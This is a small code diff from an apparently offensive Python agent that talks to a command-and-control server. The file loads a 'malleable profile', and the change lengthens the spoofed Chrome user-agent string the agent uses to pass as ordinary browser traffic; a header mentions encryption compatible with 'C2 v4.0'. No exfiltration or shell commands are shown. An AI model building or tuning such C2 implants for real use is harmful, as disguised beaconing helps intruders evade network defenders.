@@ -35,9 +35,15 @@ SESSION_ID = str(uuid.uuid4())[:8]  # New session ID for each run
 try:
     with open('malleable_profile.json', 'r') as f:
         profile = json.load(f)
-        USER_AGENT = profile.get('security', {}).get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+        USER_AGENT = profile.get(
+            'security',
+            {}
+        ).get(
+            'user_agent',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        )
 except:
-    USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
 # ==================== ENCRYPTION COMPATIBLE WITH C2 v4.0 ====================
 def get_encryption_key():
